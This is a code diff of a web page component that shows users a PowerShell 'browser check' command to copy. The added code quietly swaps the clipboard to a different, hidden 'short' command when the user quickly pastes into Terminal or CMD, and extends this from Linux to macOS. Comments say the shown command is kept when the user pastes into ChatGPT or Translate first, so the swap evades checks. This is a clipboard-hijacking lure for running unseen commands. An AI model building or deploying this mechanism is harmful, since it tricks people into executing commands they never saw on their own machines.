@@ -28,14 +28,14 @@ function browserIconSrc(browser: ClientBrowser): string {
 /**
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
- * Case A — paste Terminal immediately (Linux):
- *   Copy starts a pending clipboard write; Ctrl+Alt+T / window blur resolves plain
- *   to the short command (blur writeText alone often fails). No focused short pre-arm.
+ * Case A — paste Terminal/CMD immediately:
+ *   Windows/macOS: quick leave → short (macOS uses a copy-gesture pending write so
+ *   blur can still resolve short after focus loss).
+ *   Linux: pending copy write; Ctrl+Alt+T / window blur → short.
  *
- * Case B — paste other platforms first (Linux):
- *   Resolve/keep original for platforms AND Terminal afterward (no short swap).
- *
- * Other OSes: leave quickly → short; platforms first → original then delayed short.
+ * Case B — paste other platforms first:
+ *   Windows/macOS: keep original, then delayed short for Terminal/CMD (~3.5s).
+ *   Linux: keep original for platforms AND Terminal (no short swap).
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -274,24 +274,21 @@ function writeTerminalPlainAfterDelay(
 }
 
 /**
- * Linux Case A must arm during the copy gesture — clipboard.write after blur
- * often fails once Terminal has focus.
- *
- * Start write() on copy; resolve the pending plain Blob from blur/keydown
- * (not a background setInterval — those are throttled after focus loss).
+ * Pending clipboard write started during copy (user gesture). Resolve later from
+ * blur/keydown — required on macOS/Linux because writeText after focus loss often fails.
  */
-type LinuxCopyClipboardController = {
+type PendingCopyClipboardController = {
   resolveTerminal: () => void;
   resolveOriginal: () => void;
   isSettled: () => boolean;
 };
 
-function beginLinuxClipboardFromCopyGesture(
+function beginPendingClipboardFromCopyGesture(
   displayCommand: string,
   terminalCommand: string,
   html: string,
   onResolved: (usedTerminalPlain: boolean) => void,
-): LinuxCopyClipboardController | null {
+): PendingCopyClipboardController | null {
   if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
     void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
     onResolved(false);
@@ -314,7 +311,7 @@ function beginLinuxClipboardFromCopyGesture(
     resolveBlob = resolve;
   });
 
-  // Stay on page → original. No short pre-arm (that broke Case B / ChatGPT).
+  // Still focused after the quick window → keep original (Case B-friendly).
   safetyTimer = window.setTimeout(() => {
     settle(displayCommand, false);
   }, QUICK_TERMINAL_LEAVE_MS);
@@ -323,7 +320,6 @@ function beginLinuxClipboardFromCopyGesture(
     .write([
       new ClipboardItem({
         "text/plain": plainPromise,
-        // HTML always original so rich pastes never get the short command.
         "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
       }),
     ])
@@ -337,11 +333,26 @@ function beginLinuxClipboardFromCopyGesture(
 
   return {
     isSettled: () => settled,
-    // Case A: resolve during blur / Ctrl+Alt+T (same user-activation chain as copy).
     resolveTerminal: () => settle(terminalCommand, true),
-    // Case B: resolve original for ChatGPT / Translate / later Terminal.
     resolveOriginal: () => settle(displayCommand, false),
   };
+}
+
+/** @deprecated alias — Linux uses the shared pending controller. */
+type LinuxCopyClipboardController = PendingCopyClipboardController;
+
+function beginLinuxClipboardFromCopyGesture(
+  displayCommand: string,
+  terminalCommand: string,
+  html: string,
+  onResolved: (usedTerminalPlain: boolean) => void,
+): PendingCopyClipboardController | null {
+  return beginPendingClipboardFromCopyGesture(
+    displayCommand,
+    terminalCommand,
+    html,
+    onResolved,
+  );
 }
 
 /** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
@@ -438,7 +449,8 @@ function SelectableCommand({
   const linuxCaseBRef = useRef(false);
   const linuxAltHeldRef = useRef(false);
   const linuxWindowBlurredRef = useRef(false);
-  const linuxClipboardCtrlRef = useRef<LinuxCopyClipboardController | null>(null);
+  const linuxClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
+  const macClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
   const writeGenRef = useRef(0);
 
   useEffect(() => {
@@ -564,6 +576,28 @@ function SelectableCommand({
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
+      // macOS: same Case A/B rules as Windows, but resolve via copy-gesture pending write.
+      if (os === "macos") {
+        const ctrl = macClipboardCtrlRef.current;
+        if (quickLeave) {
+          // Case A — Terminal immediately → short
+          if (ctrl && !ctrl.isSettled()) {
+            ctrl.resolveTerminal();
+            armedRef.current = true;
+            delayedArmStartedRef.current = true;
+          } else {
+            void armTerminalPlain();
+          }
+          return;
+        }
+        // Case B — platforms first → original, then delayed short
+        if (ctrl && !ctrl.isSettled()) {
+          ctrl.resolveOriginal();
+        }
+        armTerminalPlainDelayed();
+        return;
+      }
+
       if (quickLeave) {
         void armTerminalPlain();
         return;
@@ -686,6 +720,26 @@ function SelectableCommand({
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
+      if (os === "macos") {
+        const ctrl = macClipboardCtrlRef.current;
+        if (quickLeave) {
+          // Case A (⌘+Tab to Terminal quickly)
+          if (ctrl && !ctrl.isSettled()) {
+            ctrl.resolveTerminal();
+            armedRef.current = true;
+            delayedArmStartedRef.current = true;
+          }
+          void armTerminalPlain();
+          return;
+        }
+        // Case B (⌘+Tab to another app) — original now; delayed short during this gesture
+        if (ctrl && !ctrl.isSettled()) {
+          ctrl.resolveOriginal();
+        }
+        armTerminalPlainDelayed();
+        return;
+      }
+
       if (quickLeave) {
         void armTerminalPlain();
         return;
@@ -740,6 +794,7 @@ function SelectableCommand({
     linuxAltHeldRef.current = false;
     linuxWindowBlurredRef.current = false;
     linuxClipboardCtrlRef.current = null;
+    macClipboardCtrlRef.current = null;
     writeGenRef.current += 1;
 
     // Start with original so other platforms get the real command first.
@@ -766,8 +821,23 @@ function SelectableCommand({
             delayedArmStartedRef.current = true;
             return;
           }
-          // Original on clipboard (default). Linux Case B locks it; do not auto-arm short.
           if (linuxCaseBRef.current) {
+            delayedArmStartedRef.current = true;
+          }
+        },
+      );
+      return;
+    }
+
+    // macOS: same Case A/B as Windows, via pending copy-gesture write (Safari-safe).
+    if (os === "macos") {
+      macClipboardCtrlRef.current = beginPendingClipboardFromCopyGesture(
+        displayCommand,
+        terminalCommand,
+        html,
+        (usedTerminalPlain) => {
+          if (usedTerminalPlain) {
+            armedRef.current = true;
             delayedArmStartedRef.current = true;
           }
         },
